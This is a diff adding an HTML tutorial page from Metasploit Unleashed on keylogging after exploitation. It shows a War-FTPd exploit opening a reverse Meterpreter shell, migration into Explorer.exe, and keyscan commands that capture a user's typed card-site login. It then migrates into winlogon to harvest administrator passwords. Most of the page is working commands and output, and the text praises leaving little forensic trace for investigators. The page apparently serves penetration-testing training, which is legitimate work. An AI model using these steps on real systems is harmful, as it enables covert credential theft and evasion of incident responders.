@@ -1,0 +1,70 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Keylogging</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Keylogging</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">After you have exploited a system there
+are two different approaches you can take, either smash and grab or low
+and slow.
+</p>
+<p style="color: rgb(0, 0, 0);">Low and slow can lead to a ton of great
+information, if you have
+the patience and discipline. One tool you can use for low and slow
+information gathering is the keystroke logger script with Meterpreter.
+This tool is very well designed, allowing you to capture all keyboard
+input from the system, without writing anything to disk, leaving a
+minimal forensic footprint for investigators to later follow up on.
+Perfect for getting passwords, user accounts, and all sorts of other
+valuable information.
+</p>
+<p style="color: rgb(0, 0, 0);">Lets take a look at it in action.
+First, we will exploit a system as normal.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">msf exploit(warftpd_165_user) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Connecting to FTP server 172.16.104.145:21...<br>[*] Connected to target FTP server.<br>[*] Trying target Windows 2000 SP0-SP4 English...<br>[*] Transmitting intermediate stager for over-sized stage...(191 bytes)<br>[*] Sending stage (2650 bytes)<br>[*] Sleeping before handling stage...<br>[*] Uploading DLL (75787 bytes)...<br>[*] Upload completed.<br>[*] Meterpreter session 4 opened (172.16.104.130:4444 -&gt; 172.16.104.145:1246)<br><br><u>meterpreter</u> &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Then, we will migrate Meterpreter to
+the Explorer.exe process so
+that we don't have to worry about the exploited process getting reset
+and closing our session.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; ps<br><br>Process list<br>============<br><br>    PID   Name               Path                                                   <br>    ---   ----               ----                                                   <br>    140   smss.exe           \SystemRoot\System32\smss.exe                          <br>    188   winlogon.exe       ??\C:\WINNT\system32\winlogon.exe                     <br>    216   services.exe       C:\WINNT\system32\services.exe                         <br>    228   lsass.exe          C:\WINNT\system32\lsass.exe                            <br>    380   svchost.exe        C:\WINNT\system32\svchost.exe                          <br>    408   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                          <br>    444   svchost.exe        C:\WINNT\System32\svchost.exe                          <br>    480   regsvc.exe         C:\WINNT\system32\regsvc.exe                           <br>    500   MSTask.exe         C:\WINNT\system32\MSTask.exe                           <br>    528   VMwareService.exe  C:\Program Files\VMwareVMware Tools\VMwareService.exe <br>    588   WinMgmt.exe        C:\WINNT\System32\WBEMWinMgmt.exe                     <br>    664   notepad.exe        C:\WINNT\System32\notepad.exe                          <br>    724   cmd.exe            C:\WINNT\System32\cmd.exe                              <br>    768   Explorer.exe       C:\WINNT\Explorer.exe                                  <br>    800   war-ftpd.exe       C:\Program Files\War-ftpd\war-ftpd.exe                 <br>    888   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe    <br>    896   VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe    <br>    940   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe           <br>    972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe <br>    1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe <br><br><u>meterpreter</u> &gt; migrate 768<br>[*] Migrating to 768...<br>[*] Migration completed successfully.<br><u>meterpreter</u> &gt; getpid<br>Current pid: 768</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Finally, we start the keylogger,
+wait for some time and dump the output.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; keyscan_start<br>Starting the keystroke sniffer...<br><u>meterpreter</u> &gt; keyscan_dump<br>Dumping captured keystrokes...<br>   tgoogle.cm my credit amex   myusernamthi     amexpasswordpassword </pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Could not be easier! Notice how
+keystrokes such as control and backspace are represented.
+</span>
+<p style="color: rgb(0, 0, 0);">As an added bonus, if you want to
+capture system login information
+you would just migrate to the winlogon process. This will capture the
+credentials of all users logging into the system as long as this is
+running.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; ps<br><br>Process list<br>=================<br><br>PID Name         Path<br>--- ----         ----<br>401 winlogon.exe C:\WINNT\system32\winlogon.exe<br><br><u>meterpreter</u> &gt; migrate 401<br><br>[*] Migrating to 401...<br>[*] Migration completed successfully.<br><br><u>meterpreter</u> &gt; keyscan_start<br>Starting the keystroke sniffer...<br><br>**** A few minutes later after an admin logs in ****<br><br><u>meterpreter</u> &gt; keyscan_dump<br>Dumping captured keystrokes...<br>Administrator ohnoes1vebeenh4x0red!</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Here we can see by logging to the
+winlogon process allows us to
+effectively harvest all users logging into that system and capture it.
+We have captured the Administrator logging in with a password of
+'ohnoes1vebeenh4x0red!'. </span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Maintaining_Access"
+ title="Maintaining Access">Maintaining Access</a></div>
+</body>
+</html>
